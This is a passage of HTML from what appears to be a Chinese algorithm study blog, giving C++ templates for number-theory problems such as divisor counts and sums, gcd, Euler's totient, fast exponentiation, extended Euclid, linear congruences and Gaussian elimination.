class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//约数个数</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>, mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; primes;</span><br><span class="line">    <span class="keyword">while</span> (n -- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        cin &gt;&gt; x;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= x / i; i ++ ) <span class="comment">//套用分解质因数的那个模版</span></span><br><span class="line">            <span class="keyword">while</span> (x % i == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                x /= i;</span><br><span class="line">                primes[i] ++ ;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (x &gt; <span class="number">1</span>) primes[x] ++ ;</span><br><span class="line">    &#125;</span><br><span class="line">    LL res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> p : primes) res = res * (p.second + <span class="number">1</span>) % mod;</span><br><span class="line">    cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//约数之和</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>, mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; primes;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n -- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        cin &gt;&gt; x;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= x / i; i ++ )</span><br><span class="line">            <span class="keyword">while</span> (x % i == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                x /= i;</span><br><span class="line">                primes[i] ++ ;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (x &gt; <span class="number">1</span>) primes[x] ++ ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LL res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> p : primes)</span><br><span class="line">    &#123;</span><br><span class="line">        LL a = p.first, b = p.second;</span><br><span class="line">        LL t = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (b -- ) t = (t * a + <span class="number">1</span>) % mod;</span><br><span class="line">        res = res * t % mod;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="辗转相除求最大公因数">辗转相除求最大公因数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">gcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b ? <span class="built_in">gcd</span>(b, a % b) : a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 最小公倍数 = a*b / gcd(a, b)</span></span><br></pre></td></tr></table></figure><h3 id="欧拉函数">欧拉函数</h3><p><img src="https://s2.loli.net/2024/03/30/5vD9GAcEspjROTJ.png" alt="image2"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">phi</span><span class="params">(<span class="type">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> res = x;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= x / i; i ++ )</span><br><span class="line">        <span class="keyword">if</span> (x % i == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            res = res / i * (i - <span class="number">1</span>); <span class="comment">//先除再乘避免溢出</span></span><br><span class="line">            <span class="keyword">while</span> (x % i == <span class="number">0</span>) x /= i;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">1</span>) res = res / x * (x - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线性法筛欧拉函数">线性法筛欧拉函数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1000010</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> primes[N], cnt;</span><br><span class="line"><span class="type">int</span> euler[N];</span><br><span class="line"><span class="type">bool</span> st[N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_eulers</span><span class="params">(<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    euler[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!st[i])</span><br><span class="line">        &#123;</span><br><span class="line">            primes[cnt ++ ] = i;</span><br><span class="line">            euler[i] = i - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; primes[j] &lt;= n / i; j ++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> t = primes[j] * i;</span><br><span class="line">            st[t] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span> (i % primes[j] == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                euler[t] = euler[i] * primes[j];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            euler[t] = euler[i] * (primes[j] - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">get_eulers</span>(n);</span><br><span class="line"></span><br><span class="line">    LL res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i ++ ) res += euler[i];</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="快速幂">快速幂</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//得到的值 a^b%p</span></span><br><span class="line"><span class="function">LL <span class="title">qmi</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LL res = <span class="number">1</span> % p;</span><br><span class="line">    <span class="keyword">while</span> (b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (b &amp; <span class="number">1</span>) res = res * a % p;</span><br><span class="line">        a = a * (LL)a % p;</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="扩展欧几里得算法-辗转相除法">扩展欧几里得算法（辗转相除法）</h3><p><img src="https://s2.loli.net/2024/03/30/6w2MqVbHSJor8IF.png" alt="image3"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">exgcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b)</span><br><span class="line">    &#123;</span><br><span class="line">        x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> d = <span class="built_in">exgcd</span>(b, a % b, y, x);</span><br><span class="line">    y -= a / b * x;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n -- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, b;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">        <span class="type">int</span> x, y;</span><br><span class="line">        <span class="built_in">exgcd</span>(a, b, x, y);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, x, y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="线性同余方程">线性同余方程</h3><p><img src="https://s2.loli.net/2024/03/30/15EsAy4RUpG2kxz.png" alt="image4"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">exgcd</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> &amp;x, <span class="type">int</span> &amp;y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b)</span><br><span class="line">    &#123;</span><br><span class="line">        x = <span class="number">1</span>, y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> d = <span class="built_in">exgcd</span>(b, a % b, y, x);</span><br><span class="line">    y -= a / b * x;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">while</span> (n -- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> a, b, m;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;a, &amp;b, &amp;m);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> x, y;</span><br><span class="line">        <span class="type">int</span> d = <span class="built_in">exgcd</span>(a, m, x, y);</span><br><span class="line">        <span class="keyword">if</span> (b % d) <span class="built_in">puts</span>(<span class="string">&quot;impossible&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (LL)b / d * x % m);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="高斯消元解线性方程组">高斯消元解线性方程组</h3><p><img src="https://s2.loli.net/2024/03/30/TYbGP3V6IEmA1Nh.png" alt="image5"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">110</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">double</span> eps = <span class="number">1e-8</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">double</span> a[N][N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">gauss</span><span class="params">()</span>  <span class="comment">// 高斯消元，答案存于a[i][n]中，0 &lt;= i &lt; n</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> c, r;</span><br><span class="line">    <span class="keyword">for</span> (c = <span class="number">0</span>, r = <span class="number">0</span>; c &lt; n; c ++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t = r;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = r; i &lt; n; i ++ )  <span class="comment">// 找绝对值最大的行</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">fabs</span>(a[i][c]) &gt; <span class="built_in">fabs</span>(a[t][c]))</span><br><span class="line">                t = i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">fabs</span>(a[t][c]) &lt; eps) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = c; i &lt;= n; i ++ ) <span class="built_in">swap</span>(a[t][i], a[r][i]);  <span class="comment">// 将绝对值最大的行换到最顶端</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n; i &gt;= c; i -- ) a[r][i] /= a[r][c];  <span class="comment">// 将当前行的首位变成1</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = r + <span class="number">1</span>; i &lt; n; i ++ )  <span class="comment">// 用当前行将下面所有的列消成0</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">fabs</span>(a[i][c]) &gt; eps)</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> j = n; j &gt;= c; j -- )</span><br><span class="line">                    a[i][j] -= a[r][j] * a[i][c];</span><br><span class="line"></span><br><span class="line">        r ++ ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (r &lt; n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = r; i &lt; n; i ++ )</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">fabs</span>(a[i][n]) &gt; eps)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">2</span>; <span class="comment">// 无解</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">// 有无穷多组解</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i -- )</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j ++ )</span><br><span class="line">            a[i][n] -= a[i][j] * a[j][n];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 有唯一解</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ )</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n + <span class="number">1</span>; j ++ )</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;a[i][j]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> t = <span class="built_in">gauss</span>();</span><br><span class="line">    <span class="keyword">if</span> (t == <span class="number">2</span>) <span class="built_in">puts</span>(<span class="string">&quot;No solution&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (t == <span class="number">1</span>) <span class="built_in">puts</span>(<span class="string">&quot;Infinite group solutions&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ )</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%.2lf\n&quot;</span>, a[i][n]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求组合数">求组合数</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span 